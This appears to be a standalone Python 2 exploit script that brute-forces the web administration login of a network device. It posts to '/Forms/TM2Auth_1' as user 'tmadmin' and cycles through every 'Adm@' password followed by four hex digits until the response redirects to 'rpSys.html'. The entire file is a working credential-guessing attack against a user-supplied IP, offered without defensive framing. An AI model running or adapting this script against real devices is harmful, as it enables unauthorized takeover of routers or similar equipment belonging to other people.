#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
from requests.exceptions import ConnectionError

dapw = {}
for x in xrange(65536):
    backnum = len(hex(x).split('0x')[1])
    if backnum < 4:
        num = '0' * (4 - backnum) + hex(x).split('0x')[1]
        dapw[x] = 'Adm@' + num.upper()
    else:
        num = hex(x).split('0x')[1]
        dapw[x] = 'Adm@' + num.upper()

target = str(raw_input('Target IP: '))
print 'Running...'
location = ''
for x in xrange(65536):
    print '\r-------> ' + str(x)
    payload = {'LoginNameValue': 'tmadmin',
               'LoginPasswordValue': dapw[x]}
    try:
        r = requests.post('http://' + target + '/Forms/TM2Auth_1',
                          data=payload, allow_redirects=False,
                          timeout=60)
        location = r.headers['Location']
    except ConnectionError, e:
        print str(x) + ' Error!!'
    if 'rpSys.html' in location:
        print 'Success!! The PW is ' + dapw[x]
        break

			
